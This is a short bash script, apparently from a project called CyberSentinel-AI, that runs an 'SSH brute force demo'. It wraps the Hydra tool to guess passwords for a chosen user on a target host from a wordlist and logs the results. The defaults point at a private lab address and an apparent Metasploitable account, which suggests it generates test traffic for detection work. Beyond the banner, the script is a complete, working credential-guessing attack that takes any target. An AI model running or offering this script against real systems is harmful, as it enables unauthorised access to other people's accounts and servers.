#!/bin/bash

# Banner
echo "┌───────────────────────────────────────────────┐"
echo "│                                               │"
echo "│ CyberSentinel-AI: Attack Simulation          │"
echo "│ SSH Brute Force Demo                         │"
echo "│                                               │"
echo "└───────────────────────────────────────────────┘"

# Parameters
TARGET=${1:-"192.168.122.167"}
USERNAME=${2:-"msfadmin"}
WORDLIST=${3:-"passwords.txt"}
TASKS=${4:-4}

# Create logs directory
mkdir -p logs

# Run timestamp
timestamp=$(date '+%Y-%m-%d %H:%M:%S')
echo "[$timestamp] Starting SSH brute force attack against $USERNAME@$TARGET" | tee -a logs/attack.log

# Run Hydra
hydra -l $USERNAME -P $WORDLIST ssh://$TARGET -t $TASKS -e nsr -V | tee -a logs/attack.log

# Completion timestamp
timestamp=$(date '+%Y-%m-%d %H:%M:%S')
echo "[$timestamp] Attack completed." | tee -a logs/attack.log
